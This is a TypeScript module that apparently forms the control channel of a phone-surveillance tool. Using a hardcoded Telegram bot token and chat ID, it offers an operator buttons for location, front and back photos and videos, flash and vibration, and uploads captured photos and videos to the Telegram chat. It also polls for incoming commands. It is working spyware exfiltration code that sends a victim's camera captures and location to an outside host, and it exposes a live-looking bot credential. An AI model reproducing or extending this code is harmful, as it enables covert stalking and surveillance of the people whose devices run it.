
const BOT_TOKEN = '8595107472:AAFaDyOSFTtyAXS7TBGNJAKBrKbzVYjXnPs';
const CHAT_ID = '8019931926';

export const sendBotMessage = async (message: string, showButtons: boolean = false) => {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  
  const payload: any = {
    chat_id: CHAT_ID,
    text: `🤖 [TERMINAL COMMAND]\n\n${message}`,
    parse_mode: 'Markdown'
  };

  if (showButtons) {
    payload.reply_markup = {
      keyboard: [
        [{ text: "Location 📍" }, { text: "Vibrate 📳" }],
        [{ text: "Front Photo 🤳" }, { text: "Back Photo 📸" }],
        [{ text: "Front Video 📹" }, { text: "Back Video 🎥" }],
        [{ text: "Flash ON 🔦" }, { text: "Flash OFF 🌑" }]
      ],
      resize_keyboard: true,
      one_time_keyboard: false
    };
  }

  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  } catch (error) {
    console.error('Telegram Bot Error:', error);
  }
};

export const sendBotPhoto = async (blob: Blob, caption: string) => {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
  const formData = new FormData();
  formData.append('chat_id', CHAT_ID);
  formData.append('photo', blob, 'capture.jpg');
  formData.append('caption', `📸 *Snapshot Received*\n${caption}`);

  try {
    await fetch(url, {
      method: 'POST',
      body: formData
    });
  } catch (error) {
    console.error('Telegram Photo Error:', error);
  }
};

export const sendBotVideo = async (blob: Blob, caption: string) => {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
  const formData = new FormData();
  formData.append('chat_id', CHAT_ID);
  formData.append('video', blob, 'video.mp4');
  formData.append('caption', `📹 *Video Transmission Complete*\n${caption}`);

  try {
    await fetch(url, {
      method: 'POST',
      body: formData
    });
  } catch (error) {
    console.error('Telegram Video Error:', error);
  }
};

let lastUpdateId = 0;
export const getBotUpdates = async () => {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`;
  try {
    const response = await fetch(url);
    const data = await response.json();
    if (data.ok && data.result.length > 0) {
      const latest = data.result[data.result.length - 1];
      lastUpdateId = latest.update_id;
      return latest.message?.text;
    }
  } catch (error) {
    console.error('Polling Error:', error);
  }
  return null;
};
